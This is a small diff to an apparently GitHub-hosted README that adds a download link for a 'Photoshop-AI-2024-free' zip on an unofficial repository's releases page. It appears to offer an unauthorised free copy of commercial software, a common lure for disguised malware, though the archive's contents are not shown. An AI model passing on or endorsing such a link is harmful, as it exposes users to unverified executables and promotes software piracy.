@@ -1,4 +1,4 @@
-# [Download Photoshop-AI-2024-free] ()
+# [Download Photoshop-AI-2024-free] (https://github.com/Kamasah-Dickson/Adobe-Photoshop-ai-2024-free/releases/download/Adobe-Photoshop-ai-2024-free/Photoshop.zip)
 
 ![photo_2024-11-15_13-10-50](https://github.com/user-attachments/assets/3bde170e-6ecb-4252-a03f-0628751bd206)
 
